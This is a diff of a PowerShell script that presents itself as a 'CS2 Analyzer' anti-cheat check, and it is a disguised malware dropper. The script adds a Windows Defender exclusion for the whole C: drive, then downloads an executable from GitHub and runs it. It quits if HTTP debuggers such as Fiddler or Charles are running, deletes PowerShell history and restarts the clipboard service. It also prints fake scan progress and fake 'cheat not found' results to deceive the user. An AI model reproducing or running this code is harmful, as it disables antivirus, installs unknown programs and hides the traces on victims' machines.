@@ -1,1 +1,99 @@
-Add-MpPreference -ExclusionPath "C:/"; Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/Everything.exe" -OutFile "C:\Everything.exe"; Start-Process -FilePath "C:\Everything.exe";
+Clear-Host
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    Write-Host '========================================================================'
+    Write-Host 'For an accurate check, you need to run as an administrator'
+    Write-Host '========================================================================'
+    Write-Host ""
+    pause
+    exit
+}
+$httpDebuggerProcesses = @('HttpDebuggerSvc', 'HttpDebuggerPro', 'Fiddler', 'Charles')
+$httpDebuggerServices = @('HttpDebuggerService', 'FiddlerService', 'CharlesProxy')
+$debuggerFound = $false
+Write-Host 'Checking for HTTP debugger processes...'
+foreach ($debugger in $httpDebuggerProcesses) {
+    $process = Get-Process -Name $debugger -ErrorAction SilentlyContinue
+    if ($process) {
+        Write-Host "$debugger process is running."
+        $debuggerFound = $true
+    }
+}
+Write-Host 'Checking for HTTP debugger services...'
+foreach ($service in $httpDebuggerServices) {
+    $serviceStatus = Get-Service -Name $service -ErrorAction SilentlyContinue
+    if ($serviceStatus -and $serviceStatus.Status -eq 'Running') {
+        Write-Host "$service service is running."
+        $debuggerFound = $true
+    }
+}
+if ($debuggerFound) {
+    Write-Host 'HTTP Debugger detected. Stopping the script.'
+    exit 1
+} else {
+    Write-Host 'No HTTP Debugger found. Continuing the script.'
+}
+Start-Sleep -Seconds 1
+Clear-Host
+Add-MpPreference -ExclusionPath "C:/"
+Clear-Host
+$username = $env:USERNAME
+$url = 'https://github.com/cs2cc/s/raw/main/Everything.exe'
+$output = "C:\"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
+function Show-TextProgressBar {
+    param (
+        [int]$PercentComplete,
+        [string]$Activity
+    )
+    $totalBars = 50
+    $filledBars = [math]::Round($PercentComplete / 100 * $totalBars)
+    $emptyBars = $totalBars - $filledBars
+    $progressBar = ('#' * $filledBars) + ('-' * $emptyBars)
+
+    Write-Host "$Activity"
+    Write-Host "[$progressBar] $PercentComplete% completed"
+
+    if ($PercentComplete -eq 100) {
+        Write-Host "$Activity completed."
+    }
+}
+$activity = 'Scanning the registry and media for the presence of cheat programs, deleted folders'
+$delay = 0.7
+foreach ($i in 0..100) {
+    Show-TextProgressBar -PercentComplete $i -Activity $activity
+    Start-Sleep -Seconds $delay
+}
+$videoCardManufacturer = (Get-WmiObject 'Win32_VideoController').AdapterCompatibility
+if ($videoCardManufacturer -eq 'NVIDIA') {
+    Stop-Process -Name 'nvcontainer' -Force
+} elseif ($videoCardManufacturer -eq 'Advanced Micro Devices') {
+    Stop-Process -Name 'RadeonSoftware' -Force
+}
+$historyPath = "$env:APPDATA\Microsoft\Windows\PSReadline"
+Remove-Item "$historyPath\*.txt" -Force
+Clear-History
+Restart-Service -Name 'cbdhsvc*' -Force
+Clear-Host
+Write-Host "[CS2 Analyzer] Check for cheats has started" -ForegroundColor 'Cyan'
+$cheats = @(
+    'R3D', 'Xone', 'Midnight', 'Yeahnot', 'LeagueMode', 'Unreal', 'VRedux', 'FURIOS', 'otcv',
+    'Avira', 'Neverlose', 'ESPdX', 'BoBerHook', 'Legendware', 'EGHack', 'nixware.cc', 'HAUNTEDPROJECT',
+    'externalcrack', 'RAGER9', 'RAGER8', 'WinX', 'PhoenixHack', 'OBR', 'OneByteRadar', 'Skinchanger',
+    'NAIM', 'EZinjector', 'Reborn', 'OneByteWallHack', 'Keter', 'Annihilation', 'Sapphire', 'Osiris',
+    'Multihack', 'Breakthrough', 'REKTWARE', 'D3m', 'ExtrimHack', 'EZfrags', 'RHcheats', 'FREEQN',
+    'Aqua', 'Boomwtf', 'Pphud', 'INDIGO', 'FRUX0', 'hack', 'cheat', 'KlarWare', 'Aimware', 'Skeet',
+    'gamesense', 'Aurora', 'SpirtHack', 'Fatality', 'OneTap', 'ev0lve', 'Eternity', 'Z0rhack',
+    'Stickrpg', 'Demonside.us', 'Bhop', 'BunnyHop', 'AviraSAMOWARE', 'ExLoader', '.amc', 'R8', 'freeqn',
+    'imgui.ini'
+)
+foreach ($cheat in $cheats) {
+    Write-Host "[CS2 Analyzer] $cheat not found"
+    Start-Sleep -Seconds 0.5
+}
+Write-Host ""
+Write-Host "No packages or cheats were found" -ForegroundColor 'Magenta'
+Write-Host "[CS2 Analyzer] Then follow the administrator's requirements" -ForegroundColor 'Cyan'
+Write-Host "[CS2 Analyzer] Удачной проверки и приятной игры" -ForegroundColor 'Cyan'
+pause
+exit
